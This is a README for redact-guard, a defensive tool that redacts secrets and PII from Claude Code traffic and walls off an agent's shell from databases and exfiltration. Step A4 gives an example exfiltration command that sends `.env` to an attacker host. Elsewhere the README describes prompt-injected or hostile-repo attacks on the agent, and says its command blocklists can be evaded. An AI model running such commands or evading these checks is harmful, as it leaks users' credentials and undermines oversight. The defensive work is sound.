# redact-guard

**English** · [Türkçe](README.tr.md)

> **In plain words:** redact-guard is a guard at your machine's door. Before anything Claude Code sends leaves your computer, it finds the passwords, IPs, hostnames, usernames, tokens, git names and emails, and Turkish IDs, IBANs and phone numbers, and swaps each one for a nickname like `RDX_SECRET_8353e04b5851`. Claude only ever sees the nicknames. When Claude edits a file, the guard swaps the nickname back to the real value **on your machine only**, so your files stay correct. The nickname list sits in an encrypted vault that nothing Claude runs can open. Claude can never read your databases.

Linux, macOS, WSL2 and native Windows 11. Keep IPs, usernames, passwords, API tokens, git names/emails and other PII (TCKN, VKN, IBAN, phone numbers) out of everything Claude Code sends to the model, while Claude can still read and **edit** your `.env`, Helm, YAML and log files.

```
             your machine                                         Anthropic API
┌──────────────────────────────────────────────┐
│ Claude Code ── /v1/messages ──► redact-guard ├──► sees: password: "RDX_SECRET_a93ab0e4a3ad"
│    ▲  real values on disk          │ vault   │
│    └── tool calls with REAL values ◄─────────┤◄── Edit(old: "RDX_SECRET_a93ab0e4a3ad", ...)
└──────────────────────────────────────────────┘
```

**Two modes:**
- **Gateway mode** (`ANTHROPIC_BASE_URL` → redact-guard): the simplest setup, but Claude Code then disables Remote Control.
- **Proxy mode** (`HTTPS_PROXY` + a local CA): Claude Code still talks to `api.anthropic.com`, so **Remote Control from the Claude app keeps working**, and its session mirror is redacted too. See [Remote Control](#remote-control-phone--claudeaicode-use-proxy-mode).

Both share the same detectors, vault, restore policy, hooks and tests.

Every sensitive value becomes a stable token, `RDX_<CLASS>_<12 hex>`, on its way out. The 12-character suffix never contains a run of 6+ digits, so a token can't be mistaken for a 10-digit VKN or 11-digit TCKN. Tokens are turned back into real values on the way in, but only where it's safe: an `Edit` on `values.yaml` gets the real password back, while a `Bash` command never does.

Tested with Claude Code **2.1.329 / 2.1.330**: 360 unit and integration tests, plus three end-to-end runs that drive the real CLI (gateway, proxy, and proxy behind a TLS-inspecting corporate proxy). An **independent adversarial review** attacked it with a scripted prompt-injection model; its findings and what was done about each are in [docs/REVIEW-FINDINGS.md](docs/REVIEW-FINDINGS.md).

### What it protects, and what it needs from you

Two separate problems, two kinds of protection:

1. **Keeping your data away from the model provider.** That's redaction, and it's what this project mostly is. It works on files, prompts, command output, git history and the Remote Control mirror.
2. **Keeping a prompt-injected Claude from sending data anywhere else, or reading a database.** Redaction can't do this alone: a shell command can `curl` a file somewhere. Command checks help, but the real protection is a **network boundary** (the Linux Bash sandbox, Windows Firewall `-Strict`, the egress allowlist, or container mode) plus the **isolated install**, which keeps the vault key out of reach of anything Claude runs. Set both up (Part A).

---

## How it behaves (FAQ)

**How can Claude edit a file it only sees placeholders for?**
Claude Code reads the real file from disk. redact-guard swaps sensitive values for tokens before the content goes to the model. The model writes its edit using those tokens, e.g. `old_string: password: "RDX_SECRET_a93ab0e4a3ad"`. On the way back, the tokens are turned back into the real values before Claude Code runs the edit, so the edit matches the file and writes real values. Tokens are deterministic: the same value always gets the same token, in every file and every turn. That's how Claude can tell "the host in `values.yaml`" and "the host in the log" are the same thing.

**Should I type real values or placeholders?**
Type the real values ("the db at 10.20.30.40 is slow"). Your prompt is redacted like everything else, so the model gets `RDX_IPPRIV_…`. Pasting a placeholder also works. Don't paste raw passwords into prompts; refer to them by name ("the DB password in .env"). `password: x`, `şifre: x` and "the password is x" are caught, but a bare random string in prose isn't.

**What do I see in my terminal?**
Real values: Claude's replies, the tool calls it runs, and their output (`restore_in_text: true`). You see placeholders in only three places: a blocked command's message, Claude's thinking, and a token the vault doesn't know. Set `restore_in_text: false` if you'd rather see placeholders, e.g. when screen-sharing.

**Are commands obfuscated too?**
Yes, in both directions. The model only ever sees commands and their output with tokens. When a command comes back to run locally:
- **Hosts, IPs, users, emails and names are restored** in the command itself, so `ssh RDX_USER_…@RDX_IPPRIV_…` and `git commit --author …` work.
- **Secrets and ID numbers are never put into a shell command.** That covers VKN, TCKN, IBAN, card and phone numbers, and any value that *looks* like a credential, whatever it was classified as (e.g. a GitHub token in a git remote URL). The command is replaced with an `exit 126` message telling Claude to use an env var such as `"$DB_PASSWORD"` instead.
- **Every other tool gets nothing restored:** web and MCP tools, subagent prompts, todos, `SendMessage`, Monitor's WebSocket URL, and any tool a future Claude Code version adds. Their inputs may leave your machine, and they work fine on tokens.

**Are git names and emails hidden?**
Yes. These are all covered:
- `git log` / `git show`: Author, Commit, Tagger
- Trailers: `Co-authored-by`, `Signed-off-by`, `Reviewed-by`, …
- `git blame` (normal and porcelain) and `git shortlog -sn`
- `.gitconfig` `[user] name`, and `user.name=` in `git config --list`
- `GIT_AUTHOR_NAME=`, `"author": "Name <email>"` in package.json, `authors = [{name=…}]` in pyproject
- Any `Name <email>` pair

A name learned once is then hidden everywhere, e.g. in `# TODO(Ayşe Demir)`. Bots and Claude's own trailer stay readable (`allow_names`). Two optional git hooks make sure a placeholder never lands in a commit (step B3).

**Are API tokens hidden?**
Yes. Any value under a secret-like key is hidden, and so are these formats, even without a key:
- AWS, GitHub `ghp_`/`github_pat_`, GitLab `glpat-`, Slack, Stripe, Google, OpenAI/Anthropic `sk-`, npm, Hugging Face, SendGrid, DigitalOcean, Shopify, and ~220 more from the bundled Gitleaks rules
- JWTs, `Authorization:` and `Cookie:` headers
- `.npmrc` `_authToken`/`_auth`
- Docker `config.json` `auth`, plus its decoded `user:pass`
- `.netrc`, `.git-credentials`, `.pgpass`, and remote URLs with embedded tokens (`https://<token>@github.com/…`)
- High-entropy strings, PEM key lines even when read without the `BEGIN` line

**What about `${NAME:default}` placeholders and URL-valued keys?**
Defaults are redacted by what the key means, and the structure stays readable:
```yaml
DIS_SERVIS: ${_DIS_SERVIS:http://RDX_HOST_…:8080/dis/api}   # host hidden, port + path readable
dbPassword: ${DB_PASSWORD:RDX_SECRET_…}                      # default password hidden
logLevel: ${LOG_LEVEL:info}                                   # left alone
_VERIFICATION_RS_URL: https://RDX_HOST_…/api/v1/verify
MY_SERVER_ADDRESS2: RDX_HOST_…
```
Spring (`${a:b}`) and shell (`${A:-b}`, `${A:=b}`) forms are both handled, nested ones too. Keys ending in `url`, `uri`, `endpoint`, `address`, `server`, `host`, `servis`, `service`, `gateway`, `broker`, … (with suffixes like `_LOCAL` or `2`) get their host tokenized unless it's public (github.com, maven central, …).

---

## Step-by-step: running it on your projects

### Part A: one-time setup

**A1. Get it and run the tests**
```bash
git clone <this repo> ~/tools/redact-guard     # or unzip it there
cd ~/tools/redact-guard
python3 -m venv .venv && . .venv/bin/activate
pip install -r requirements-dev.txt
python -m pytest -q                              # expect: 360 passed
```

**A2. Tell it about your company.** Edit `config/redact-guard.yaml`:
```yaml
detectors:
  extra_internal_domains: [.acme.com.tr, .acme.internal]   # your domains: hidden everywhere
  allow_users: [ubuntu, node]                               # system users that may stay readable
  # names_file: ~/.config/redact-guard/names.txt           # customer/employee names, one per line
  custom:
    - pattern: '\bSIP-[0-9]{8}\b'                           # e.g. your order-number format
      class: CUSTOM
egress:
  enabled: true                                             # recommended, see A4
  allow: [registry.npmjs.org, pypi.org, files.pythonhosted.org, repo.maven.apache.org]
```
`extra_internal_domains` matters most: hostnames under your domains are then hidden wherever they appear, not just under host-like keys. Managed cloud database hostnames (`*.rds.amazonaws.com`, `*.database.windows.net`, `*.mongodb.net`, …) are hidden by default.

**A3. Install it isolated (recommended).** redact-guard then runs as a separate account, and the vault key, the vault and the local CA key are readable only by that account. Nothing Claude runs as you can dump the key and decrypt the vault.

*Linux* (systemd), proxy mode, so Remote Control works:
```bash
sudo scripts/linux/install-system.sh            # or: sudo CORP_PROXY=http://proxy.corp:8080 scripts/linux/install-system.sh
```
This copies the code to `/opt/redact-guard` (root-owned, so Claude can't edit the hooks or config). It creates the `redact-guard` system user and runs the service as that user, with its state in `/var/lib/redact-guard` (mode 0700). It puts the public CA and the hook secret in `/etc/redact-guard`, and applies the Claude Code settings for you. Config changes: edit `/etc/redact-guard/redact-guard.yaml`, then `sudo systemctl restart redact-guard`.

*Windows:* see the [Windows section](#windows-11-including-a-windows-vm); `install.ps1` is isolated by default.

*Per-user (weaker, e.g. macOS):* run `python -m redact_guard proxy -c config/redact-guard.yaml` (or `serve` for gateway mode) as yourself, e.g. from a systemd user unit or launchd, then run `python scripts/render_settings.py --mode proxy --apply`. Everything works, but the key sits in your profile. `doctor` warns about this.

**A4. Put a network boundary around Claude's shell.** This is what stops `curl https://attacker/?d=$(cat .env)`, `git push` to someone else's repo, and direct database connections.
- *Linux/macOS/WSL2:* the Claude Code Bash sandbox is on in the rendered settings. On Linux, install its dependencies: `sudo apt-get install bubblewrap socat`. Its default domain allowlist has package registries only, not `github.com`, because github.com accepts pushes. Add what your builds need.
- *Proxy mode, any OS:* set `egress.enabled: true` (A2). Claude's shell inherits `HTTPS_PROXY` from the settings, so anything going through the proxy can then reach only Anthropic and the allowlisted hosts. Refusals are logged as `egress_denied`.
- *Windows:* the firewall script (Windows step 5) blocks direct connections that skip the proxy.

**A5. Optional, strongest on a host: managed settings**
```bash
python scripts/render_settings.py --mode proxy --managed > /tmp/managed-settings.json
sudo install -m 644 /tmp/managed-settings.json /etc/claude-code/managed-settings.json
```
This pins the proxy or gateway settings so no project or user file can override them. It also adds `allowManagedHooksOnly`, `allowManagedPermissionRulesOnly` and `allowManagedDomainsOnly`.

### Part B: for each project

**B0. Check the setup:** `cd ~/work/orders-api && /opt/redact-guard/.venv/bin/python -m redact_guard doctor -c /etc/redact-guard/redact-guard.yaml` (per-user install: `python -m redact_guard doctor`). Run it from the project folder, as yourself and not elevated. Fix every FAIL; each line has a hint. It checks the key isolation, the hook interpreter, this project's `.claude/settings*.json`, telemetry, the proxy or gateway with its NO_PROXY, the CA, your existing proxy, and TLS to Anthropic.

**B1. Audit what will be hidden**
```bash
python -m redact_guard audit ~/work/orders-api
```
The audit shows:
- counts per class
- the files with the most substitutions
- how many git names/emails would be hidden
- a **review** list: sensitive-sounding keys whose value was left as-is. These are usually references like `${VAR}` or `existingSecret: name`. Values are never printed.

**B2. Spot-check exactly what the model would see**
```bash
python -m redact_guard scan ~/work/orders-api/.env ~/work/orders-api/charts/values.yaml
```
If something real is still visible, add a domain, a custom pattern or a names-file entry (A2), then re-run until it's clean.

**B3. Install the git hooks**, which stop placeholders from reaching a commit or commit message (binary files and `++…` lines included). Claude can't skip them: `--no-verify`, `-n` and `core.hooksPath` are blocked in its shell.
```bash
scripts/install-git-hook.sh ~/work/orders-api
```

**B4. Work normally**
```bash
cd ~/work/orders-api && claude
```
Type real values in your prompts; you'll see real values in replies.

**B5. Check it's doing its job** (first session only)
- Ask Claude *"show me the database password in .env"*. You see the real value, and the audit log shows a `SECRET` count for that request.
- Ask Claude *"run psql against the database"*. It must be blocked.
- Stop redact-guard and send a prompt. It must be refused with "Prompt NOT sent". Then start it again.
- Run `/hooks` and check that both redact-guard hooks are listed.

### Daily use notes
- If the git hook flags a placeholder in a file, Claude probably wrote it through the shell. Ask it to use Edit/Write instead, which restore real values.
- A shell command blocked because of a secret is working as designed. Have the command read the value from `.env` or an env var.
- **A repository's own `.claude/settings.json` may not set routing or interpreter env vars, hooks, `apiKeyHelper` or `disableAllHooks`.** The prompt hook refuses to send while it does, because that is exactly how a hostile repo would redirect your session. Move what you need into your user settings.
- To keep the same tokens on another machine, copy the key and `vault.bin` from the state folder. Otherwise a fresh vault is fine.
- **A message from your phone had no effect?** Two local traces tell you where it stopped. The audit log records `downlink` lines when something arrives from the phone (type names and sizes only, never content). The hook keeps its own log of every prompt it sent or BLOCKED, with the reason, because a blocked prompt only shows a message in the VM's terminal, not on the phone: `%LOCALAPPDATA%\redact-guard\hook.log` on Windows, `~/.local/state/redact-guard/hook.log` elsewhere. Neither contains the prompt itself.
- **"Waiting for API response · will retry in … · check your network"** appears when Claude Code gets no bytes for 20 s. `doctor` shows a `reply streaming` line. If replies "arrived whole (Content-Length)", something between redact-guard and Anthropic (a proxy or a security scanner) holds each reply until the model has finished, so a long answer stays silent and then lands all at once. Versions before 2026-11-23v also forwarded that Content-Length after restoring tokens had changed the body's size, which left the connection hanging after a reply that had already arrived. That is fixed: redact-guard now re-sends such replies chunked (`FAKE_CONTENT_LENGTH=1 tests/e2e/run_proxy.sh` reproduces the case). Proxy-mode settings also set `CLAUDE_STREAM_FIRST_BYTE_TIMEOUT_MS=600000` and `API_TIMEOUT_MS=900000` (Claude Code 2.1.242 or later), so a long held reply is waited for instead of being aborted and retried.

---

## Windows 11 (including a Windows VM)

Pick one of two paths.

**Path 1: WSL2 inside the VM (preferred, if it works).** Run Claude Code, redact-guard and your repos inside a WSL2 Ubuntu distribution, and follow Part A/B above unchanged. You keep every layer, including the Bash sandbox. WSL2 inside a VM needs *nested virtualization* enabled on the hypervisor:
- Hyper-V host: `Set-VMProcessor -VMName <vm> -ExposeVirtualizationExtensions $true` while the VM is off
- VMware: "Virtualize Intel VT-x/EPT or AMD-V/RVI"
- Cloud VMs: only on instance types that support it

If `wsl --install` fails with a virtualization error, use Path 2.

**Path 2: native Windows.** Everything works except the Claude Code Bash sandbox, which doesn't run on native Windows. The renderer leaves it out, because `failIfUnavailable` would otherwise stop Claude Code from starting. **Windows Firewall and the egress allowlist** replace the sandbox's network layer. Recent Claude Code versions use a PowerShell tool on Windows; the command checks understand PowerShell, cmd and Git Bash.

### Path 2, step by step (one-time, ≈20 min)

1. **Prerequisites:** Python 3.10+ from python.org and Git for Windows. Put the repo at a path without spaces, e.g. `C:\redact-guard`. Tune `config\redact-guard.yaml` (A2) *before* installing.
2. **Install (elevated PowerShell).** Proxy mode is the default, so Remote Control keeps working:
   ```powershell
   cd C:\redact-guard
   powershell -ExecutionPolicy Bypass -File scripts\windows\install.ps1 -ApplySettings              # isolated, proxy mode
   powershell -ExecutionPolicy Bypass -File scripts\windows\install.ps1 -ApplySettings -Mode gateway
   powershell -ExecutionPolicy Bypass -File scripts\windows\install.ps1 -ApplySettings -PerUser     # weaker, no elevation
   ```
   The isolated install does the following:
   - Creates `.venv` and runs the tests.
   - Detects your existing proxy *as you* and writes it into the config, because the SYSTEM account can't see your user proxy settings.
   - Registers a Scheduled Task `redact-guard` that runs as **SYSTEM** at startup, with its state in `C:\ProgramData\redact-guard\state` (SYSTEM and Administrators only).
   - Exports only the public CA to `C:\ProgramData\redact-guard\public\ca.pem`, next to the hook secret.
   - Makes `C:\redact-guard` read-only for Users, so Claude can't edit the hooks or code.
   - Writes your Claude Code settings. The hooks run as `"C:/redact-guard/.venv/Scripts/python.exe" -I …`: an absolute interpreter, with `-I` so a repo can't hijack them with `PYTHONPATH`.

   Health check: `Invoke-RestMethod http://redact-guard.invalid/healthz -Proxy http://127.0.0.1:8788`.
3. **Never run Claude Code itself in an elevated ("Run as administrator") terminal.** An elevated process can read the state folder; your normal un-elevated terminal can't. `doctor` checks this.
4. **Config changes later** (elevated): edit `config\redact-guard.yaml`, re-run `install.ps1`, which regenerates the state config, and restart the task: `Stop-ScheduledTask redact-guard; Start-ScheduledTask redact-guard`.
5. **Network layer (elevated)**:
   ```powershell
   powershell -ExecutionPolicy Bypass -File scripts\windows\firewall-block-db.ps1 -BlockClaudeDirect -RegisterRefreshTask
   # only on a machine that is NOT domain-joined: add -Strict -ProxyPorts 8080 (your proxy's port)
   ```
   Run it **after** installing Claude Code, because it looks for `claude.exe`, including WinGet installs. On a **domain-joined company VM, leave out `-Strict`**: it also blocks Kerberos, LDAP and SMB, which breaks domain logon, group policy, file shares and agents that report to their server. There, ask IT for the equivalent at the network level.
   This does three things:
   - Blocks database ports outbound for the whole VM.
   - With `-Strict`, allows only DNS, NTP, HTTP(S) and your proxy ports out.
   - With `-BlockClaudeDirect`, lets `claude.exe` reach nothing but loopback (redact-guard), re-applied at every logon.

   Child processes Claude starts (`curl.exe`, `python.exe`, `git.exe`) can still make direct HTTPS connections. With `-Strict` and the egress allowlist they're limited to what goes through the proxy, but a process that ignores `HTTPS_PROXY` can still reach any host on 443. **The only complete answer on native Windows is hypervisor-level filtering:** give the VM's virtual network (vSwitch, NSG, security group) no route to your database subnets, and allow outbound traffic only to your corporate proxy. Nothing inside the VM can undo that.
6. **Optional lock-down** (elevated): render `--managed` settings (A5) and copy them to `C:\Program Files\ClaudeCode\managed-settings.json`.

**Troubleshooting: "Access denied" / "Erişim engellendi" when Python starts.** Either the folder lock or your endpoint protection is blocking `.venv\Scripts\python.exe`. `install.ps1` now locks the folder last, checks that Python still starts, and restores the permissions if it doesn't. To find out which one it is (elevated):
```powershell
icacls D:\redact-guard\.venv\Scripts\python.exe               # who may run it
& D:\redact-guard\.venv\Scripts\python.exe -c "print('ok')"     # elevated
icacls D:\redact-guard /reset /T /Q                              # undo the lock, then try again
```
- If it runs after `/reset`, it was the lock. Re-install with `-NoLock` and protect the folder another way, for example by asking IT to allow writes only for admins.
- If it still fails, check the endpoint protection log (Trend Micro: Security Agent → Logs) for a blocked `python.exe`, and ask IT for an exclusion for that path.

Then run `doctor` **as you, not elevated**. Its `hook runs as you` line runs the real hook command. If that line fails, Claude Code would treat the hook as a non-blocking error, which means the hooks are off.

**Per project (Windows):** the same as Part B, with these commands:
- Check: `C:\redact-guard\.venv\Scripts\python.exe -m redact_guard doctor -c C:\redact-guard\config\redact-guard.yaml`, run from the project folder and not elevated.
- Audit: `C:\redact-guard\.venv\Scripts\python.exe -m redact_guard audit C:\work\orders-api`
- Git hooks: `powershell -ExecutionPolicy Bypass -File scripts\windows\install-git-hook.ps1 C:\work\orders-api`

**Windows-specific notes**
- **Windows integrated authentication (SQL Server with `-E` / `Trusted_Connection` / SSPI) needs no password at all**, so redacting secrets can't protect you there. That's why the command checks cover `sqlcmd -E`, `Invoke-Sqlcmd`, .NET/ODBC/OLE DB connections, integrated-auth connection strings and encoded PowerShell. It's also why the network layer matters most on a domain-joined VM. If you can, run Claude Code under a local account that has no database logins.
- **Windows Firewall doesn't filter loopback.** Don't run a database inside the same VM.
- **Also hidden on Windows:** `C:\Users\<name>`, `C:/Users/<name>`, `/c/Users/<name>` and `DOMAIN\user`. Built-ins like `NT AUTHORITY\SYSTEM` stay readable. CRLF files and Windows credential stores (`cmdkey`, `Get-StoredCredential`, DPAPI) are covered too.
- **Proxy credentials:** with the isolated install, `CORP_PROXY_AUTH` must be a *machine* environment variable, because the SYSTEM task doesn't see user variables.
- **Untested on Windows:** policy, CRLF, paths, the settings render and hook input are unit-tested. The PowerShell scripts, including the isolated install and the firewall rules, have not been run end to end; no Windows machine was available. On your first session, run `doctor`, the B5 checks and `/hooks`.

---

## Remote Control (phone / claude.ai/code): use proxy mode

Remote Control is turned off whenever `ANTHROPIC_BASE_URL` points anywhere but `api.anthropic.com`, so **gateway mode can't have it**. **Proxy mode** gets around it without disabling anything:

```
 Claude Code ──(HTTPS_PROXY, trusts local CA)──► redact-guard proxy ──► api.anthropic.com
   │  thinks it talks to api.anthropic.com           │ decrypts ONLY Anthropic/Claude hosts
   │  → Remote Control stays available                │ • /v1/messages: same redaction + restore as gateway mode
   │                                                  │ • Remote Control session sync (WebSocket NDJSON, SSE+POST, forms): redacted
   │                                                  │ • auth/OAuth: untouched · other hosts: tunnel (or egress allowlist)
   ▼
 your phone sees placeholders, never real values
```

**Why it's needed:** while Remote Control is connected, Claude Code mirrors the session to Anthropic, and the transcript is stored there so your phone can show it. That mirror is built from your **local** session, which holds real values: your cwd, Claude's restored replies, tool inputs, command output. Proxy mode redacts that upload too:
- **What gets redacted:** every string goes through all detectors, plus an exact match on every value the vault has ever seen. A JSON key also counts as context: `{"token": "…"}` is a secret even with no `token=` in sight.
- **What's kept:** ids, enums, timestamps and tool names under protocol keys, so the phone app can still pair tool calls with results. A person's name under `"name"`, or an email under `"user_id"`, is still redacted.
- **What's refused:** anything that can't be inspected, and any frame where a known value survives. Error messages and the audit log never quote content.

**Setup:** the isolated installers do it, and so does `install.ps1`. Per-user:
```bash
python -m redact_guard proxy --init -c config/redact-guard.yaml     # creates the local CA, prints its path
python -m redact_guard proxy -c config/redact-guard.yaml
python scripts/render_settings.py --mode proxy --apply              # HTTPS_PROXY + NODE_EXTRA_CA_CERTS, no base URL
```

**Then use it as normal:** run `claude`, then `/remote-control` (or `claude --remote-control`), and open the session in the Claude app.

**What you'll see:**
- **Terminal:** real values, as before.
- **Phone:** placeholders like `RDX_HOST_…` and `RDX_SECRET_…` for anything sensitive; ordinary text is unchanged. Usernames with a digit, `.` or `_` are replaced everywhere; plain-word usernames, which are often also database or schema names, are hidden only where the context says they're a username, the same as for the model, and never inside a host name or path.
- **Typing on the phone:** what you type goes through Anthropic before it reaches your machine, so don't type secrets there. Refer to things by name ("the db password in .env"), or copy a placeholder from the phone screen. Both work.

**What keeps it from being bypassed:**
- **Settings:** the proxy and CA are pinned in both spellings (`https_proxy` wins in Claude Code), and `NO_PROXY` covers only loopback (plus hosts you add with `--no-proxy-extra`). `--managed` makes them non-overridable.
- **Prompt hook:** sends a fresh nonce to wherever Claude Code's traffic will actually go, and requires an HMAC proof that only your redact-guard can produce. The secret is read from a fixed local path, never from env. So a look-alike endpoint that a hostile repo points you at fails, even if it answers `{"ok": true}`. The hook also refuses to send when:
  - `NO_PROXY` holds `*`, an IP range, or anything that covers an Anthropic host, normalised the way Node does (ports, trailing dots, `*.` and case stripped)
  - `ANTHROPIC_BASE_URL` is set
  - the CA is missing
  - `NODE_TLS_REJECT_UNAUTHORIZED=0` is set
  - OTEL prompt logging is on
  - the project's settings try to re-route traffic
- **Windows Firewall:** `-BlockClaudeDirect` blocks `claude.exe` from everything but loopback.
- **Telemetry:** off (`DISABLE_TELEMETRY`, `DISABLE_ERROR_REPORTING`, `OTEL_LOG_USER_PROMPTS=0`), and Datadog/Sentry hosts are refused at the proxy. Remote Control stays available with `DISABLE_TELEMETRY` set (Claude Code v2.1.283+), unless your organization requires Trusted Devices.

**Requirements:** a claude.ai login (Pro, Max, Team or Enterprise; Remote Control doesn't work with API keys), and Claude Code v2.1.51 or later.

**Status, honestly:**
- Proxy mode is tested end to end with the real Claude Code CLI (`tests/e2e/run_proxy.sh`), including the egress allowlist refusing a prompt-injected `curl … @.env`.
- The Remote Control upload redaction is unit-tested against frames shaped like the published protocol research, plus the reviewer's attack frames.
- It was **not** tested against the live Remote Control service, because that needs a claude.ai login the build environment didn't have.

**First-run check:** start `/remote-control`, then look for `uplink` events and no `refused` in the audit log. On the phone, confirm you see placeholders where your real hosts and paths would be. If Remote Control won't connect and the log shows `uplink_refused`, an upload type wasn't inspectable; report the path. `REDACT_GUARD_UNINSPECTABLE=pass` only lets *binary* bodies through, never text that failed to parse.

**Other remote options** that need none of this: Remote Desktop into the VM (the session survives disconnects), or SSH and `claude --continue`.

---

## Your existing proxy (corporate / system proxy)

**redact-guard sits in front of it; it doesn't replace it.**

```
Claude Code ──► redact-guard (redacts) ──► your existing proxy ──► internet / api.anthropic.com
Everything else on the PC ─────────────────► your existing proxy (unchanged)
```

Only Claude Code is pointed at redact-guard, through its own settings. Your browser, npm, git and other programs keep using the existing proxy exactly as before. A side effect: your corporate proxy and its logs only ever see redacted traffic from Claude Code. In gateway mode this relies on `NO_PROXY` covering loopback, which the settings set and the prompt hook and `doctor` check.

**Detection** (`corporate_proxy.url: auto`, the default), in order:
1. `HTTPS_PROXY` / `HTTP_PROXY` in redact-guard's own environment (its own address is ignored).
2. The Windows system proxy (Settings → Network → Proxy, including its bypass list).

The isolated installers run this detection as you at install time and write the result into the service config. You can also set it explicitly: `url: http://proxy.corp:8080`, or `none` for a direct connection.

**TLS-inspecting proxies** (Zscaler, Netskope, Palo Alto, Fortinet, …) re-sign traffic with a company CA. `corporate_proxy.ca: system` (the default) trusts the OS certificate store plus Mozilla's bundle, so a CA that IT installed on the machine just works. If it isn't in the store, export it to a PEM file and set `ca: C:/path/corp-ca.pem`. This was tested by chaining behind a TLS-inspecting proxy, both simulated (`tests/e2e/run_chain.sh`) and real.

**Special cases:**
- **Proxy needs a username/password (Basic):** put `user:password` in an environment variable and set `corporate_proxy.auth_env: CORP_PROXY_AUTH`.
- **NTLM / Kerberos proxy, or a PAC script:** run a helper that does it, such as [px](https://github.com/genotrance/px), and chain: `corporate_proxy.url: http://127.0.0.1:3128`. `doctor` warns when it sees a PAC script.
- **Programs Claude starts, and your internal hosts:** Claude Code's settings make every program Claude runs use redact-guard as its proxy, if that program reads `HTTPS_PROXY`. Node, Python, Go, curl, git and .NET Core do; Java, Maven, Gradle and Windows PowerShell 5.1's web commands don't. So internal calls still go direct, the renderer copies your **Windows proxy bypass list** into `NO_PROXY`, translated for those tools (`*.corp.example` → `.corp.example`, `10.20.*` → `10.20.0.0/16`). Internal hosts are then reached exactly as before, and only internet traffic goes through redact-guard to your corporate proxy. Add more with `--no-proxy-extra host1,.domain2`, or skip the copy with `--no-system-bypass`. Anthropic hosts, `*` and public IP ranges are refused, both there and by the prompt hook.

---

## Similar projects, and what redact-guard borrowed

None of them handle Claude Code's Remote Control upload, which is why this project exists, but they had good ideas:

| Project | What it is | Borrowed / compared |
|---|---|---|
| [KeyClaw](https://docs.rs/crate/keyclaw/latest) (Rust) | Local HTTPS proxy with a vault and placeholders, restored in HTTP/SSE/WebSocket | **Borrowed:** `doctor` command, allowlist by SHA-256 digest, Gitleaks rules |
| [mirage-proxy](https://docs.rs/crate/mirage-proxy/latest) (Rust) | Replaces secrets with *plausible fakes* | **Compared:** fakes read more naturally, but can't be told apart from real values. redact-guard keeps explicit `RDX_` tokens that the git hooks can catch |
| [agent-proxy](https://pkg.go.dev/github.com/muthuishere/agent-proxy) (Go) | Local MITM proxy for AI agents | **Borrowed:** chaining behind a corporate proxy with system-proxy auto-detection |
| [LocalAI MITM proxy](https://localai.io/docs/features/mitm-proxy/) | PII filter for Claude Code / Codex through `HTTPS_PROXY` | Confirms the proxy-mode approach works with Pro/Max subscriptions |
| [iron-proxy](https://github.com/ironsh/iron-proxy) | Egress allowlist and secret swapping for agents and CI | Same idea as the egress allowlist |
| [Gitleaks](https://github.com/gitleaks/gitleaks) | Secret scanner | **Bundled:** its ~220 provider rules (MIT) as an extra detector |

---

## The layers

| # | Layer | What it stops | Where |
|---|---|---|---|
| 1 | **Redaction** (gateway or proxy) | Secrets/PII in prompts, file contents, tool output, tool definitions, the system prompt, history, and the Remote Control mirror | `redact_guard/` |
| 2 | **Restore policy** | Real secrets, ID numbers and anything credential-shaped going into shell commands; *anything* going into web, MCP, subagent or unknown tools | `policy.py`, `engine.py` |
| 3 | **Leak canary + fail-closed** | Any known value surviving redaction, in any letter case, inside a word or base64-encoded; vault-key bytes in a request; malformed or uncheckable requests and responses | `engine.py`, `server.py`, `mitm_addon.py` |
| 4 | **PreToolUse hook** | DB clients, also run indirectly; DB URIs and driver code; tunnels and raw sockets; secret stores; DB files recognised by content under any name; running a DB script Claude wrote; vault access, globs included; git hook bypass | `hooks/guard.py`, `policy.py` |
| 5 | **UserPromptSubmit hook** | Sending a prompt unless the traffic provably goes through your redact-guard; hostile project settings; OTEL prompt logging | `hooks/guard.py`, `healthproof.py` |
| 6 | **Permission deny rules** | DB clients and files, plus edits to redact-guard itself, enforced by Claude Code | `settings/` |
| 7 | **Isolated install** | Claude's shell reading the vault key or editing redact-guard | `scripts/linux/`, `scripts/windows/install.ps1` |
| 8 | **Network boundary**: Bash sandbox (Linux/macOS/WSL2), egress allowlist (proxy mode), Windows Firewall / VM network | Exfiltration from the shell; direct DB connections | `settings/`, `config/`, `scripts/windows/` |
| 9 | **Git hooks** | Placeholders landing in commits or commit messages | `scripts/` |
| 10 | **Managed settings** *(optional)* | Any file loosening 4–6 or re-routing traffic | `settings/managed-additions.json` |
| 11 | **Container mode** *(optional, strongest)* | Everything: no route to your LAN, DBs or the internet except via the gateway | `container/` |

The layers overlap, but they aren't fully independent: the command checks (2, 4, 6) are pattern-based and can be evaded by a determined prompt injection. What holds regardless is **1 + 3** for what reaches the model, and **7 + 8** for what a shell can reach.

### "Claude can never read the databases": what actually holds
- **Network databases:** the network boundary (8) is what makes them unreachable: the sandbox, firewall or VM rules, or container mode. The command checks (2, 4, 6) stop the obvious and many non-obvious attempts (indirect execution, dynamic command names, tunnels, raw sockets, HTTP DB APIs, cloud data-plane CLIs, `kubectl exec`), but they are a blocklist.
- **No credentials:** DB passwords reach Claude only as tokens, and tokens are never restored into shell commands. Windows integrated auth needs no password; there, only the network layer helps.
- **Local DB files:** the hook recognises SQLite, pg_dump, Redis RDB, Access, DuckDB and MDF files by content under any name, and blocks reading them and running scripts Claude wrote that contain DB driver code. That's best effort: a database file outside the project, or a pre-existing script, is reachable. Keep database files out of the projects you open, or use container mode.

---

## Container mode (strongest)

```bash
export ANTHROPIC_API_KEY=sk-ant-...        # lives only in the gateway container
PROJECT_DIR=~/work/app docker compose -f container/docker-compose.yml up -d gateway
PROJECT_DIR=~/work/app docker compose -f container/docker-compose.yml run --rm dev
```

- `dev` runs Claude Code on an **internal-only** network whose only neighbour is `gateway`.
- `gateway` forwards model traffic (redacted) and offers an HTTPS CONNECT allowlist for package registries. It always refuses `api.anthropic.com`, so the redacting path is the only way to reach the model.
- The vault and key live in the `guard-state` volume, which is never mounted into `dev`. Only the hook secret is shared, read-only.
- The API key never enters `dev`: Claude Code gets a dummy token and the gateway swaps in the real one.
- Managed settings and the placeholder note are baked into the image.

To use your claude.ai login instead of an API key, remove `api_key_env` / `ANTHROPIC_API_KEY`, log in inside `dev`, and add the Anthropic auth hosts from the gateway's `egress_denied` lines to `egress.allow`. *These container files haven't been built or run; there was no Docker daemon in the build environment. Treat them as a starting point.*

---

## What's detected

| Class | Examples |
|---|---|
